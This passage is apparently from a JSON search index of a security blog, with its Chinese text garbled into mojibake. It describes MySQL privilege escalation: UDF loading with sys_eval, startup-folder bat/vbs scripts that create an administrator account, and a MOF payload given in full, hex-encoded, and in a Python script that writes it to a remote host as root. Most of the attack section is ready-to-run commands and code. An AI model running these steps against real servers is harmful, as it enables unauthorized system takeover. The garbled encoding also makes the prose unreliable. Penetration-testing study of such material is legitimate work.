‡æœåŠ¡å™¨ä¼šå´©æºƒæ‰ã€‚ï¼‰ GoodRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæœ‰ä¸€ä¸ªé»˜è®¤ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”æ˜¯è¿™ç§ç±»å‹è½¯ä»¶çš„â€œå¸¸è§æƒ…å†µâ€ï¼ˆè‹±æ–‡ï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºçš„Windows 7ï¼ŒæœåŠ¡å™¨çš„2012ç­‰å¸¸ç”¨ï¼‰ NormalRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæ˜¯å¯é çš„ï¼Œä½†æ˜¯ä¾èµ–äºç‰¹å®šçš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”ä¸èƒ½æˆ–è€…ä¸èƒ½å¯é åœ°è‡ªåŠ¨æ£€æµ‹ã€‚ AverageRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºä¸å¯é æˆ–è€…éš¾ä»¥åˆ©ç”¨ã€‚ LowRanking å¯¹äºé€šç”¨çš„å¹³å°è€Œè¨€ï¼Œè¯¥æ¼æ´åˆ©ç”¨ç¨‹åºå‡ ä¹ä¸èƒ½åˆ©ç”¨ï¼ˆæˆ–è€…ä½äº 50% çš„åˆ©ç”¨æˆåŠŸç‡ï¼‰ ManualRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºä¸ç¨³å®šæˆ–è€…éš¾ä»¥åˆ©ç”¨å¹¶ä¸”åŸºäºæ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰ã€‚å¦‚æœä¸€ä¸ªæ¨¡å—åªæœ‰åœ¨ç”¨æˆ·ç‰¹åˆ«é…ç½®è¯¥æ¨¡å—çš„æ—¶å€™æ‰ä¼šè¢«ç”¨åˆ°ï¼Œå¦åˆ™è¯¥æ¨¡å—ä¸ä¼šè¢«ä½¿ç”¨åˆ°ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥è¯„ä¸ºè¯¥ç­‰çº§ã€‚ï¼ˆä¾‹å¦‚ï¼šexploit/unix/webapp/php_evalï¼‰ searchæœç´¢ å·²çŸ¥ä¸€ä¸ªæ¼æ´ï¼Œæˆ‘æƒ³çŸ¥é“Metasploité‡Œé¢æ˜¯å¦æœ‰ç›¸å…³çš„æ¨¡å—ï¼Œå°±å¯ä»¥ç”¨searchè¿›è¡Œæœç´¢\n"
    }
,
    {
        "title": "MySQLææƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/mysql%E6%8F%90%E6%9D%83/",
        "content": "MySQLææƒ mysqlçš„æƒé™æå‡é€šå¸¸å¯ä»¥ä¸¤ç§ï¼š\nUDFææƒï¼ˆå¸¸ç”¨ï¼‰ å†™æ–‡ä»¶ææƒ å¯åŠ¨é¡¹ææƒ mofææƒ ä¸€ã€UDFææƒ UDF å…¨ç§°ä¸ºuser defined functionï¼Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°\nç”¨æˆ·å¯ä»¥æ·»åŠ è‡ªå®šä¹‰çš„æ–°å‡½æ•°åˆ°Mysqlä¸­ï¼Œä»¥è¾¾åˆ°åŠŸèƒ½çš„æ‰©å……ï¼Œè°ƒç”¨æ–¹å¼ä¸ä¸€èˆ¬ç³»ç»Ÿè‡ªå¸¦çš„å‡½æ•°ç›¸åŒï¼Œä¾‹å¦‚ contact()ï¼Œuser()ï¼Œversion()ç­‰å‡½æ•°\nUDFææƒçš„ä½œç”¨ æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ‹¿ä¸‹ä¸€å°ä½æƒé™çš„ä¸»æœºshellï¼ˆå°¤å…¶æ˜¯windowsï¼‰æ—¶ï¼Œæœ‰äº›æ“ä½œæ— æ³•è¿›è¡Œï¼Œè€Œæ­¤æ—¶æœ¬åœ°æ°å¥½å­˜åœ¨mysqlæ•°æ®åº“ï¼Œä¸”mysqlæ˜¯rootæƒé™ (windowsä¸­mysqlä¸€èˆ¬éƒ½æ˜¯ç®¡ç†å‘˜æƒé™)ï¼Œå°±å¯ä»¥é€šè¿‡æ–°å»ºç®¡ç†å‘˜ç”¨æˆ·ç­‰æ“ä½œå®ç°ææƒå³udfææƒï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºé€šè¿‡mysqlè·å¾—ç®¡ç†å‘˜æƒé™\nåŠ¨æ€é“¾æ¥åº“ åŠ¨æ€é“¾æ¥åº“ï¼šæ˜¯æŠŠç¨‹åºä»£ç ä¸­ä¼šä½¿ç”¨çš„å‡½æ•°ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¿å­˜åœ¨.dllæ–‡ä»¶ä¸­ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œä¸ä¼šæŠŠå‡½æ•°çš„æœºå™¨ç å¤åˆ¶ä¸€ä»½åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ç¼–è¯‘å™¨åªä¼šåœ¨.exeçš„æ‰§è¡Œæ–‡ä»¶é‡Œï¼Œè¯´æ˜æ‰€è¦è°ƒç”¨çš„å‡½æ•°æ”¾åœ¨å“ªä¸€ä¸ª*.dllæ–‡ä»¶ã€‚ç¨‹åºæ‰§è¡Œä½¿ç”¨åˆ°è¿™äº›å‡½æ•°æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠdllæ–‡ä»¶ä¸­çš„å‡½æ•°æ‹¿å‡ºæ¥ç»™æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨\næ³¨ï¼šåœ¨linuxä¸­å¯¹åº”ä¸ºsoæ–‡ä»¶\nåˆ©ç”¨æ¡ä»¶ä»¥åŠæ•°æ®åº“ç‰ˆæœ¬é—®é¢˜ è·å¾—ä¸€ä¸ªmysqlæ•°æ®åº“è´¦å·ï¼ˆæœ€å¥½æ˜¯rootï¼‰ï¼Œæ‹¥æœ‰insertã€deleteæƒé™ï¼Œæ‹¥æœ‰å°†xxx.dllå†™å…¥ç›¸å¯¹åº”ç›®å½•çš„æƒé™\næŸ¥çœ‹ç‰ˆæœ¬ï¼š\nselect version(); æŸ¥çœ‹secure-file-privæ˜¯å¦æœ‰ç›®å½•é™åˆ¶ï¼Œæ‰§è¡Œï¼š\nshow global variables like \u0026#34;secure%\u0026#34;; å½“secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ— æ³•è¿›è¡Œææƒ å½“secure_file_priv çš„å€¼ä¸º c:/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨cç›˜ç›®å½•ä¸‹ï¼Œæ— æ³•è¿›è¡Œææƒ å½“ secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œå¯ä»¥ææƒ æŸ¥çœ‹pluginç›®å½•æ˜¯å¦å­˜åœ¨ï¼š\nselect @@plugin_dir; #æˆ– show variables like \u0026#39;plugin%\u0026#39;; udfåˆ©ç”¨çš„å…¶ä¸­ä¸€æ­¥ï¼Œæ˜¯è¦å°†æˆ‘ä»¬çš„xxx.dllæ–‡ä»¶ä¸Šä¼ åˆ°mysqlæ£€ç´¢ç›®å½•ä¸­ï¼Œmysqlå„ç‰ˆæœ¬çš„æ£€ç´¢ç›®å½•æœ‰æ‰€ä¸åŒï¼š\nç‰ˆæœ¬ è·¯å¾„ MySQL \u0026lt; 5.0 å¯¼å‡ºè·¯å¾„éšæ„ 5.0 \u0026lt;= MySQL \u0026lt; 5.1 éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šC:\\windows\\system32\\ï¼‰ 5.1 \u0026lt; MySQL å¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginç›®å½•ä¸‹ï¼ˆé«˜ç‰ˆæœ¬mysqlé»˜è®¤ä¸å­˜åœ¨lib\\pluginç›®å½•ï¼Œéœ€è¦è‡ªå·±åˆ›å»ºï¼‰ ç‰ˆæœ¬å¤§äº5.1çš„æ—¶å€™ï¼Œlib\\pluginæ–‡ä»¶å¤¹çš„åˆ›å»ºæ–¹æ³•ï¼š\nselect @@basedir; #æŸ¥æ‰¾åˆ°mysqlçš„ç›®å½• select \u0026#39;It is dll\u0026#39; into dumpfile \u0026#39;C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.1\\\\lib::$INDEX_ALLOCATION\u0026#39;; #åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½• select \u0026#39;It is dll\u0026#39; into dumpfile \u0026#39;C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.1\\\\lib\\\\plugin::$INDEX_ALLOCATION\u0026#39;; #åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½• udfæ–‡ä»¶çš„è·å–ä¸ä¸Šä¼  å¾ˆå¤šç°æˆçš„udfæ–‡ä»¶ï¼Œä¸éœ€è¦è‡ªå·±æ„é€ ï¼š\nä»sqlmapä¸­è·å– sqlmapä¸­çš„udfæ–‡ä»¶ä¸ºäº†é˜²æ­¢è¯¯æ€è¿›è¡Œäº†å¼‚æˆ–å¤„ç†ï¼Œéœ€è¦åˆ©ç”¨sqlmapè‡ªå¸¦çš„è§£ç è„šæœ¬\npython /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll #win python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so #linux ä»msfä¸­è·å–\n/usr/share/metasploit-framework/data/exploits/mysqlï¼Œç›´æ¥cpå‡ºæ¥å°±å¯ä»¥ï¼Œä¸éœ€è¦è§£ç \nä½¿ç”¨MSFä¸­çš„exploit/multi/mysql/mysql_udf_payloadæ¨¡å—ä¹Ÿå¯ä»¥è¿›è¡ŒUDFææƒ,MSFä¼šå°†dllå†™å…¥lib\\plugin\\ç›®å½•ä¸‹(å‰ææ˜¯ç›®å½•å­˜åœ¨,å¦‚æœç›®å½•ä¸å­˜åœ¨,åˆ™ä¸èƒ½æˆåŠŸ),DLLæ–‡ä»¶å¯ä»¥å–ä»»æ„çš„åå­—,è¯¥dllæ–‡ä»¶åŒ…å«sys_exec()å’Œsys_eval()ä¸¤ä¸ªå‡½æ•°.ä½†æ˜¯é»˜è®¤åªåˆ›å»ºsys_exec()å‡½æ•°,è¯¥å‡½æ•°æ‰§è¡Œå¹¶ä¸ä¼šæœ‰å›æ˜¾,æˆ‘ä»¬å¯ä»¥æ‰‹å·¥åˆ›å»ºsys_eval()å‡½æ•°,æ¥æ‰§è¡Œæœ‰å›æ˜¾çš„å‘½ä»¤\nå›½å…‰å¸ˆå‚…çš„åšå®¢ï¼šhttps://www.sqlsec.com/udf/\nå¾—åˆ°udfæ–‡ä»¶åï¼Œå¯åˆ©ç”¨webshellä¸Šä¼ æˆ–è€…hexç¼–ç ä¸Šä¼ ï¼ˆè¿™é‡Œåªæ˜¯ä¸¾ä¾‹ï¼Œå®é™…ä¸Šï¼Œä¸Šä¼ çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œæ­¥éª¤å¤šå˜ï¼Œåº”å½“è§†æƒ…å†µè€Œå®šï¼‰:\nåˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ç”¨æ¥å­˜æ”¾DLL/SOæ–‡ä»¶çš„åå…­è¿›åˆ¶å†…å®¹\nCREATE TABLE temp_udf(udf blob); æ’å…¥\nè½¬åŒ–æˆåå…­è¿›åˆ¶æ–¹æ³•å¾ˆå¤šè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨mysql\nselect hex(load_file(\u0026#39;C:/udf,dll\u0026#39;)) into dumpfile \u0026#39;c:/udf.txt\u0026#39;; æ³¨ï¼šoutfileå¯¼å‡ºæ–‡ä»¶ä¼šåœ¨æœ«å°¾å†™å…¥æ–°è¡Œä¸”è½¬ä¹‰æ¢è¡Œç¬¦,ç ´åäºŒè¿›åˆ¶æ–‡ä»¶ç»“æ„,dumpfileä¸ä¼šè¿›è¡Œä»»ä½•æ“ä½œ\næ’å…¥\nå…¶ä¸­$binaryCodeä¸ºå·²ç»è½¬æ¢å¥½çš„åå…­è¿›åˆ¶å†…å®¹,$binarycodeå‰åŠ 0X\nINSERT into temp_udf values (CONVERT($binaryCode,CHRA)); å¯¼å‡º\nå°†udfæ–‡ä»¶å¯¼å‡ºè‡³å¯¹åº”ä½ç½®ï¼š\nSELECT * FROM temp_udf INTO DUMPFILE \u0026#34;/usr/lib64/mysql/plugins/udf.so\u0026#34;; æ³¨:æ­¤æ—¶å¦‚æœå‡ºç°äº†é”™è¯¯Can\u0026rsquo;t create/write to fileæ˜¯å› ä¸ºæ²¡æœ‰lib/pluginç›®å½•into dumpfileä¹Ÿä¸èƒ½åˆ›å»ºæ–‡ä»¶å¤¹æ‰€ä»¥æŠ¥é”™\nä½¿ç”¨udf.dll udfå¸¸ç”¨å‡½æ•°ï¼š\nsys_evalï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºè¿”å›ã€‚ sys_execï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†é€€å‡ºç è¿”å›ã€‚ sys_getï¼Œè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ sys_setï¼Œåˆ›å»ºæˆ–ä¿®æ”¹ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ å‡è®¾æˆ‘çš„udfæ–‡ä»¶åä¸ºâ€˜udf.dllâ€™ï¼Œä¸”å·²ç»ä¸Šä¼ åˆ°äº†mysqlæ£€ç´¢ç›®å½•ä¸­ï¼Œæ¥ä¸‹æ¥åªéœ€è¦å¼•å…¥å³å¯\n# å®ä¾‹ CREATE FUNCTION sys_eval RETURNS STRING SONAME \u0026#39;udf.dll\u0026#39;; åªæœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯function_nameï¼ˆå‡½æ•°åï¼‰ï¼Œæˆ‘ä»¬æƒ³å¼•å…¥çš„å‡½æ•°æ˜¯sys_evalã€‚è¿˜æœ‰ä¸€ä¸ªå˜é‡æ˜¯shared_library_nameï¼ˆå…±äº«åŒ…åç§°ï¼‰ï¼Œå³â€˜xxx.dllâ€™ã€‚\nå¯ä»¥æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼š\nselect * from mysql.func; è‡³æ­¤ä¾¿æˆåŠŸå¼•å…¥äº†sys_evalå‡½æ•°ï¼Œç”¨äºåœ¨mysqlä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š\nselect sys_eval(\u0026#39;whoami\u0026#39;); å¦‚æœè¦å¸è½½è¯¥å‡½æ•°ï¼š\ndrop function sys_eval; å®æ“ äº†è§£åŸºæœ¬åŸç†å’Œæµç¨‹åï¼Œæ¥ä¸‹æ¥ç”¨å®é™…æ“ä½œç†Ÿæ‚‰ä¸€ä¸‹å…·ä½“çš„åˆ©ç”¨æ‰‹æ³•\nvulnhub-Raven:2ï¼šå…·ä½“æ“ä½œè§æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼švulnhub-Raven:2 æ¸—é€è®°å½• äºŒã€å†™æ–‡ä»¶ææƒ å†™æ–‡ä»¶ææƒé’ˆå¯¹äºwindowsç³»ç»Ÿï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä½¿ç”¨MySQLçš„outfileæˆ–dumpfileå‡½æ•°ï¼Œå‘windowsç‰¹å®šç›®å½•ä¸­å†™å…¥æ–‡ä»¶æ¥ä»¥è¢«åŠ¨çš„æ–¹å¼ææƒï¼Œæ‰€ä»¥è¿™æ ·ææƒçš„å‰ææ˜¯secure_file_privå˜é‡è®¾ç½®ä¸ºç©º\n1.å¯åŠ¨é¡¹ææƒ åŸç† windowså¼€æœºæ—¶å€™éƒ½ä¼šæœ‰ä¸€äº›å¼€æœºå¯åŠ¨çš„ç¨‹åºï¼Œç”¨æˆ·å¯åŠ¨é¡¹ä¼šä»¥å½“å‰ç™»å½•ç”¨æˆ·çš„æƒé™è¿è¡Œï¼Œåˆ©ç”¨è¿™ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªåŠ¨åŒ–è„šæœ¬å†™å…¥å¯åŠ¨é¡¹ï¼Œè¾¾åˆ°ææƒçš„ç›®çš„\nMySQLçš„å¯åŠ¨é¡¹ææƒï¼ŒåŸç†å°±æ˜¯é€šè¿‡mysqlæŠŠä¸€æ®µbatæˆ–vbsè„šæœ¬å¯¼å…¥åˆ°ç³»ç»Ÿçš„å¯åŠ¨é¡¹æ–‡ä»¶å¤¹ä¸­ï¼Œå¦‚æœç®¡ç†å‘˜å¯åŠ¨æˆ–è€…é‡å¯çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆè¯¥è„šæœ¬å°±ä¼šè¢«è°ƒç”¨ï¼Œå¹¶æ‰§è¡Œè„šæœ¬é‡Œé¢çš„å‘½ä»¤ï¼ˆåˆ›å»ºç®¡ç†å‘˜è´¦æˆ·ï¼‰ï¼Œå®ç°æƒé™æå‡\nä¸Šä¼ è„šæœ¬ getshellåï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ä¸Šç³»ç»Ÿç›˜çš„å¯è¯»å¯å†™ç›®å½•ï¼Œè‹¥æ˜¯å¯åŠ¨ç›®å½• â€œC:\\Users\\ç”¨æˆ·å\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupâ€ æ˜¯å¯è¯»å¯å†™çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä¸Šä¼ ä¸€ä¸ªvbsæˆ–è€…batçš„è„šæœ¬ï¼š\nbatæ‰§è¡Œçš„åŸºç¡€å‘½ä»¤ï¼š\n@echo off net user test1 Q!w2e3r4 /add net localgroup administrators test1 /add vbsæ‰§è¡Œçš„åŸºç¡€å‘½ä»¤ï¼š\nset wshshell=createobject(\u0026#34;wscript.shell\u0026#34;) a=wshshell.run(\u0026#34;cmd.exe /c net user ttt Q!w2e3r4 /add\u0026#34;,0) b=wshshell.run(\u0026#34;cmd.exe /c net localgroup administrators ttt /add\u0026#34;,0) æˆ–\nset wsnetwork=CreateObject(\u0026#34;WSCRIPT.NETWORK\u0026#34;) os=\u0026#34;WinNT://\u0026#34;\u0026amp;wsnetwork.ComputerName Set ob=GetObject(os) \u0026#39;å¾—åˆ°adsiæ¥å£,ç»‘å®š Set oe=GetObject(os\u0026amp;\u0026#34;/Administrators,group\u0026#34;) \u0026#39;å±æ€§,adminç»„ Set od=ob.Create(\u0026#34;user\u0026#34;,\u0026#34;test1\u0026#34;) \u0026#39;å»ºç«‹ç”¨æˆ· od.SetPassword \u0026#34;Q!w2e3r4\u0026#34; \u0026#39;è®¾ç½®å¯†ç  od.SetInfo \u0026#39;ä¿å­˜ Set of=GetObject(os\u0026amp;\u0026#34;/test1\u0026#34;,user) \u0026#39;å¾—åˆ°ç”¨æˆ· oe.add os\u0026amp;\u0026#34;/test1\u0026#34; ä¸Šé¢è„šæœ¬ä½œç”¨æ˜¯ï¼š\nåˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸º test1ã€å¯†ç ä¸º Q!w2e3r4 çš„ç”¨æˆ·å¸æˆ· å°†è¯¥ç”¨æˆ·å¸æˆ·æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼Œèµ‹äºˆè¯¥ç”¨æˆ·ç®¡ç†å‘˜æƒé™ å€¼å¾—ä¸€æçš„æ˜¯ï¼šbatè„šæœ¬åœ¨å¯åŠ¨è¿è¡Œæ—¶ä¼šæœ‰æ˜æ˜¾çš„DOSçª—å£å¼¹å‡ºæ¥ï¼Œè€ŒVBSè„šæœ¬åˆ™å¯ä»¥å®Œå…¨éšè—çª—å£ä¸”ä¸ä¼šæœ‰é”™è¯¯æç¤ºï¼Œä¹Ÿå¯ä»¥å†™ä¸€å¥å®Œæˆè„šæœ¬åè‡ªåŠ¨åˆ é™¤æ­¤è„šæœ¬çš„è¯­å¥\nå†™å…¥å¯åŠ¨é¡¹ ä¸Šä¼ åç›´æ¥mysqlè¯­å¥å†™å…¥å³å¯ï¼š\nè¿æ¥åˆ°å¯¹æ–¹MYSQL æœåŠ¡å™¨\nè¿›å…¥testæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“ä¸€èˆ¬æƒ…å†µä¸‹æ²¡æœ‰è¡¨\nç›´æ¥å†™ï¼š\nselect load_file(\u0026#34;C:/www/vbs.txt\u0026#34;) into dumpfile \u0026#34;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/test.bat\u0026#34;; æ¥ä¸‹æ¥åªè¦æœåŠ¡å™¨é‡å¯ï¼Œå³å¯ææƒæˆåŠŸï¼ˆé€šå¸¸æˆ‘ä»¬ä¼šä¸»åŠ¨å»é‡å¯æœåŠ¡å™¨ï¼Œåˆ©ç”¨è¿œç¨‹æº¢å‡ºï¼ˆMs12-020ï¼‰æˆ–ç¤¾å·¥æ‰‹æ³•ç­‰ï¼‰\n2.MOFææƒ MOF æ‰˜ç®¡å¯¹è±¡æ ¼å¼ (MOF) æ–‡ä»¶æ˜¯åˆ›å»ºå’Œæ³¨å†Œæä¾›ç¨‹åºã€äº‹ä»¶ç±»åˆ«å’Œäº‹ä»¶çš„ç®€ä¾¿æ–¹æ³•ã€‚åœ¨windows 2003åŠæ›´ä½ç‰ˆæœ¬windowsä¸­ï¼Œnullevt.mofæ–‡ä»¶å­˜å‚¨åœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹ï¼Œwindowsç³»ç»Ÿæ¯éš”äº”ç§’å°±ä¼šä»¥systemæƒé™æ‰§è¡Œä¸€æ¬¡è¯¥æ–‡ä»¶ï¼Œå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ï¼Œæ‰§è¡ŒæˆåŠŸä¼šç§»åŠ¨åˆ°è¯¥ç›®å½•ä¸‹çš„goodæ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œå¤±è´¥ç§»åŠ¨åˆ°badæ–‡ä»¶å¤¹\nåŸç† å¯¹mofæ–‡ä»¶è¿›è¡Œåˆ©ç”¨ï¼Œä¿®æ”¹æ­¤æ–‡ä»¶ï¼Œå°†å…¶ä¸­ä¸€éƒ¨ä»½vbsä»£ç æ›¿æ¢ä¸ºåé—¨ä»£ç æˆ–æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤åï¼Œä½¿ç”¨dumpfileå‡½æ•°å¯¼å…¥c:/windows/system32/wbem/mof/æ–‡ä»¶å¤¹ï¼Œç³»ç»Ÿå†æ¬¡æ‰§è¡Œè¯¥æ–‡ä»¶å³å¯å®Œæˆæƒé™æå‡\nåˆ©ç”¨æ¡ä»¶ mofææƒéœ€è¦åœ¨system32æ–‡ä»¶å¤¹ä¸‹å†™æ–‡ä»¶ï¼Œæ¡ä»¶è¾ƒä¸ºä¸¥è‹›ï¼š\nwindows 2003åŠä»¥ä¸‹ç‰ˆæœ¬\nmysqlå¯åŠ¨èº«ä»½å…·æœ‰æƒé™å»è¯»å†™c:/windows/system32/wbem/mofç›®å½•\nsecure_file_privå‚æ•°ä¸ä¸ºnull\nåˆ©ç”¨ æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„vbsè„šæœ¬å¦‚ä¸‹ï¼š\n#pragma namespace(\u0026#34;\\\\\\\\.\\\\root\\\\subscription\u0026#34;) instance of __EventFilter as $EventFilter { EventNamespace = \u0026#34;Root\\\\Cimv2\u0026#34;; Name = \u0026#34;filtP2\u0026#34;; Query = \u0026#34;Select * From __InstanceModificationEvent \u0026#34; \u0026#34;Where TargetInstance Isa \\\u0026#34;Win32_LocalTime\\\u0026#34; \u0026#34; \u0026#34;And TargetInstance.Second = 5\u0026#34;; QueryLanguage = \u0026#34;WQL\u0026#34;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \u0026#34;consPCSV2\u0026#34;; ScriptingEngine = \u0026#34;JScript\u0026#34;; ScriptText = \u0026#34;var WSH = new ActiveXObject(\\\u0026#34;WScript.Shell\\\u0026#34;)\\nWSH.run(\\\u0026#34;net.exe user Yuy0ung admin123 /add\\\u0026#34;)\u0026#34;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; åœ¨æ·»åŠ ç”¨æˆ·ä¹‹åï¼Œè¿˜éœ€è¦å°†ç”¨æˆ·åŠ å…¥æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼Œå°†è„šæœ¬ä¸­çš„net.exe user Yuy0ung admin123 /add\\æ¢æˆï¼š\nnet localgroup Administrators Yuy0ung /add è„šæœ¬æ–‡ä»¶çš„ä¸Šä¼ æ€è·¯ä¸udfææƒç±»ä¼¼ï¼Œå¤§æ¦‚ä¸‰ç§ï¼š\nç›´æ¥ä¸Šä¼ ç„¶ådumpfile\nselect load_file(\u0026#34;C:/test.mof\u0026#34;) into dumpfile \u0026#34;c:/windows/system32/wbem/mof/nullevt.mof\u0026#34; ç›´æ¥å°†è„šæœ¬çš„16è¿›åˆ¶ç¼–ç dumpfile\nselect 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e2229200a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c746572200a7b200a202020204576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b200a202020204e616d6520203d202266696c745032223b200a202020205175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e742022200a20202020202020202020202022576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c222022200a20202020202020202020202022416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b200a2020202051756572794c616e6775616765203d202257514c223b200a7d3b200a0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d6572200a7b200a202020204e616d65203d2022636f6e735043535632223b200a20202020536372697074696e67456e67696e65203d20224a536372697074223b200a2020202053637269707454657874203d200a202020202276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e65786520757365722061646d696e2061646d696e202f6164645c2229223b200a7d3b200a0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e67200a7b200a20202020436f6e73756d65722020203d2024436f6e73756d65723b200a2020202046696c746572203d20244576656e7446696c7465723b200a7d3b into dumpfile \u0026#39;C:/windows/system32/wbem/mof/nullevt.mof\u0026#39;; æ•°æ®åº“å…è®¸è¿œç¨‹é“¾æ¥çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨pyå†™å…¥\n#Python3 import MySQLdb conn=MySQLdb.connect(host=\u0026#34;192.168.111.6\u0026#34;,user=\u0026#34;root\u0026#34;,passwd=\u0026#34;root\u0026#34;) payload = r\u0026#39;\u0026#39;\u0026#39; #pragma namespace(\u0026#34;\\\\\\\\.\\\\root\\\\subscription\u0026#34;) instance of __EventFilter as $EventFilter { EventNamespace = \u0026#34;Root\\\\Cimv2\u0026#34;; Name = \u0026#34;filtP2\u0026#34;; Query = \u0026#34;Select * From __InstanceModificationEvent \u0026#34; \u0026#34;Where TargetInstance Isa \\\u0026#34;Win32_LocalTime\\\u0026#34; \u0026#34; \u0026#34;And TargetInstance.Second = 5\u0026#34;; QueryLanguage = \u0026#34;WQL\u0026#34;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \u0026#34;consPCSV2\u0026#34;; ScriptingEngine = \u0026#34;JScript\u0026#34;; ScriptText = \u0026#34;var WSH = new ActiveXObject(\\\u0026#34;WScript.Shell\\\u0026#34;)\\nWSH.run(\\\u0026#34;net.exe user xxxx xxx /add\\\u0026#34;)\u0026#34;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; \u0026#39;\u0026#39;\u0026#39; ascii_payload = \u0026#39;\u0026#39; for each_chr in payload: ascii_payload += str(ord(each_chr)) + \u0026#39;,\u0026#39; ascii_payload = ascii_payload[:-1] cur = conn.cursor() sql = \u0026#34;select char(%s) into dumpfile \u0026#39;C:/windows/system32/wbem/mof/nullevt.mof\u0026#39;\u0026#34; % ascii_payload cur.execute(sql) conn.close() æ³¨æ„äº‹é¡¹ æœåŠ¡å™¨ä¼šæ¯äº”ç§’ä¼šå¾ªç¯æ‰§è¡Œä¹‹å‰çš„mofæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåœ¨æœåŠ¡å™¨è¢«mofææƒåï¼Œéœ€è¦è§£å†³ç³»ç»Ÿç»§ç»­è¿è¡Œæ¶æ„ä»£ç çš„é—®é¢˜ï¼š\nnet stop winmgmt #åœæ­¢winmgmtæœåŠ¡ rmdir /q /s c:\\windows\\system32\\wbem\\repository #åˆ é™¤å­˜å‚¨åº“å¤‡ä»½ del /f /s c:\\windows\\system32\\wbem\\mof\\good\\nullevt.mof #åˆ é™¤mofæ–‡ä»¶ net start winmgmt #é‡å¯winmgmtæœåŠ¡ 